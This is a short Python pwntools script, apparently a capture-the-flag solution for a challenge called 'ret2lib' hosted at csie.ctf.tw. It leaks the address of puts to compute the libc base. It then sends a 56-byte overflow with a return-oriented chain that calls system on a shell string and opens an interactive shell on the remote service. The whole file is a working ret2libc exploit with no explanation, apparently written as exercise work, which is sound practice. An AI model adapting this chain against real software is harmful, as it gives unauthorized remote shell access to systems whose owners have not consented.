from pwn import *

context.arch = "amd64"

libc = ELF('./libc.so.6')

pop_rdi = 0x400823

#r = process('./ret2lib')
r = remote("csie.ctf.tw", 10127)
r.sendafter(":", '0x601018')
libc_base = int(r.recvuntil('\n').strip()[8:],16) - libc.symbols['puts']
system_address = libc_base + libc.symbols['system']
r.recvuntil('\n')

payload = 'A' * 56 + flat([pop_rdi, libc_base + 0x18cd17, system_address])

r.send(payload)
r.interactive()
